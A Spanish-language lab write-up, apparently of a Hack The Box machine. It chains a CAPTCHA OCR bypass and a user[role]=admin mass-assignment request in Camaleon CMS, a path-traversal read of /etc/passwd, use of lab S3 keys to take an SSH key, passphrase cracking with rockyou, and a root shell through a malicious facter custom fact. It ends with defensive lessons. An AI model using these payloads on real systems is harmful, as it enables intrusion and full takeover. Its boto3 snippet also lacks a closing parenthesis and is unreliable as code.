## CVE-2025-2304 — MASS ASSIGNMENT

### CAPTCHA Automation

El formulario de registro incluye un CAPTCHA de 5 caracteres (A-Z, 0-9). La clave del bypass es mantener la misma sesión HTTP entre la carga del formulario, la descarga de la imagen CAPTCHA y el POST de registro. Usamos Tesseract OCR con whitelist:

```python
# Descargar CAPTCHA con el mismo opener (mismas cookies de sesión)
img_bytes = opener.open(captcha_url).read()
```

```bash
# OCR con whitelist de caracteres
$ tesseract cap.png stdout --psm 8 \
  -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
```

### Explotación — Parámetro user[role]=admin

Camaleon CMS no filtra el parámetro `user[role]` en el controlador de registro. Enviamos el campo extra en el POST:

```http
POST /admin/register HTTP/1.1
Host: facts.htb

authenticity_token=<TOKEN>
user[username]=pwn1337
user[email]=pwn@evil.com
user[password]=Hacker123!
user[role]=admin        <-- mass assignment
captcha=<OCR_RESULT>

# HTTP 200 -- cuenta creada con rol admin
```

## CVE-2024-46987 — LOCAL FILE INCLUSION

El endpoint `/admin/media/download_private_file` usa el parámetro `file` para construir una ruta sin sanitización. Permite path traversal con `../../` para leer cualquier fichero accesible por el proceso Rails (usuario `trivia`).

```
GET /admin/media/download_private_file?file=../../../../../../etc/passwd

[+] root:x:0:0:root:/root:/bin/bash
[+] trivia:x:1000:1000::/home/trivia:/bin/bash
[+] william:x:1001:1001::/home/william:/bin/bash
```

## MINIO S3 — SSH KEY EXFILTRATION

Con las credenciales S3 accedemos al servicio MinIO en el puerto 54321. Existen dos buckets: `randomfacts` (imágenes públicas) e `internal` (archivos privados de trivia).

```python
import boto3
from botocore.client import Config

s3 = boto3.client('s3',
    endpoint_url='http://10.129.2.88:54321',
    aws_access_key_id='AKIA05159E5E65AF81C1',
    aws_secret_access_key='f4xVBFMlIvDgOypQAVO+x6vb+Xi2LLKMOI2Xq2Oe',
    config=Config(signature_version='s3v4')

# Buckets encontrados: randomfacts, internal
```

## SSH ACCESS — USER trivia

### Cracking de Passphrase

La clave está cifrada con bcrypt KDF (aes256-ctr). Usamos `ssh-keygen` con el diccionario rockyou:

```bash
$ chmod 600 id_ed25519
$ while IFS= read -r pass; do
    result=$(ssh-keygen -y -f id_ed25519 -P "$pass" 2>/dev/null)
    [ -n "$result" ] && echo "FOUND: $pass" && break
  done < /usr/share/wordlists/rockyou.txt

FOUND: dragonballz
```

## PRIVILEGE ESCALATION — FACTER → ROOT

```bash
trivia@facts:~$ sudo -l
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` es una herramienta Ruby de Puppet que carga "custom facts" como scripts Ruby desde directorios arbitrarios. Creamos un fact malicioso:

```bash
$ echo 'Facter.add(:pwn) { setcode { exec("/bin/bash -p") } }' > /tmp/pwn.rb
$ sudo facter --custom-dir=/tmp pwn

root@facts:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

## LECCIONES APRENDIDAS

| Concepto       | Detalle |
|:---------------|:--------|
| CAPTCHA        | Vincular el CAPTCHA a la sesión es correcto pero no suficiente si el OCR es viable. Rate limiting y expiración corta son esenciales. |
| MASS ASSIGN    | Los frameworks deben usar strong parameters para filtrar campos sensibles como "role" en modelos de usuario. |
| LFI            | Nunca construir rutas de fichero desde input del usuario sin sanitización. Usar allowlists de directorios permitidos. |
| SECRETS IN DB  | Las credenciales cloud no deben almacenarse en texto plano en la BD. Usar variables de entorno o vaults cifrados. |
| SSH PASSPHRASE | Passphrases débiles en claves cifradas son crackeables. Usar frases largas o hardware keys (FIDO2). |
| SUDO NOPASSWD  | Cualquier binario con NOPASSWD que ejecute código de scripting (Ruby, Python, Perl) debe considerarse privesc trivial. |
| CHAINING       | Vulnerabilidades de severidad media encadenadas logran comprometer completamente un sistema. |
